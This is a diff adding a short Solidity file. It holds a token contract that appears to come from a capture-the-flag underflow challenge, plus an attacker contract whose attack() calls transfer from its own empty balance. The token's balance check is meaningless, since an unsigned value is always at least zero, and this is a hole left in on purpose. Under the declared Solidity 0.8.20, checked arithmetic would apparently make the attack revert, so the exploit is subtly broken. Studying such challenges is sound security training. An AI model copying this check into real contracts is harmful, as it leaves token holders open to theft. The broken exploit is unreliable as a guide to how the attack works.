@@ -1,0 +1,34 @@
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.20;
+
+contract Token {
+    mapping(address => uint) balances;
+    uint public totalSupply;
+
+    constructor(uint _initialSupply) {
+        balances[msg.sender] = totalSupply = _initialSupply;
+    }
+
+    function transfer(address _to, uint _value) public returns (bool) {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+    }
+
+    function balanceOf(address _owner) public view returns (uint balance) {
+        return balances[_owner];
+    }
+}
+
+contract Hach2 {
+    Token private immutable token;
+
+    constructor(address _token) {
+        token = Token(_token);
+    }
+
+    function attack() external {
+        token.transfer(msg.sender, 10);
+    }
+}
